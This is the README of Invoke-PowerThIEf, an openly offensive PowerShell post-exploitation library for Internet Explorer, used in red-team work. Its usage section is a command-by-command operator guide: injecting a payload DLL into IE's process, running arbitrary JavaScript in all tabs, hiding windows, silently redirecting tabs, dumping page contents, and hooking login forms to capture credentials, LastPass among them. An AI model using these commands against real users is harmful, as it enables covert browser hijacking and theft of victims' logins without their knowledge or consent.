# Invoke-PowerThIEf 2018 Nettitude
An IE Post Exploitation Library

Written by Rob Maslen @rbmaslen

# Examples
### Capturing credentials entered via LastPass
<p align="center">
  <img src="https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Images/creds-lastpass.gif?raw=true" width="400" title="LastPass Credentials in transit">
</p>

# Usage
First import the module using . .\Invoke-PowerThIEf.ps1 then use any of the following commands.

### List URLs for all current IE browser sessions, result will contain the BrowserIndex used by other actions
Invoke-PowerThIEf -action ListUrls

### Launch the DLL(x64) specified by the PathPayload param in IE's process
Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>

### Invoke the JavaScript in all currently opened IE windows and tabs
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>

### Invoke JavaScript in the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script <JavaScript to run>

### Dump the HTML of all currently opened IE windows/tabs
Invoke-PowerThIEf -action DumpHthml

### Dump the HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>

### Dump the HTML from all tags of <type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div

### Dump the HTML from any tag with the <id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv

### Dump the HTML from any tag with the <name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv

### Set to visible all IE windows/tabs
Invoke-PowerThIEf -action ShowWindow

### Show the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>

### Hide all currently opened IE windows/tabs
Invoke-PowerThIEf -action HideWindow

### Hide the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>

### Navigate all currently opened IE windows/tabs to the <URL>
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 

### Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

### Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

### Automatically scan any windows or tabs for login forms and record what gets posted. Once credentials have come in use -action creds to list them
Invoke-PowerThIEf -action HookLoginForms 

### List any creds that have been captured
Invoke-PowerThIEf -action Creds 

### Open a new background tab in the window that the <BrowserIndex> is in.
Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>

# License
FreeBSD 3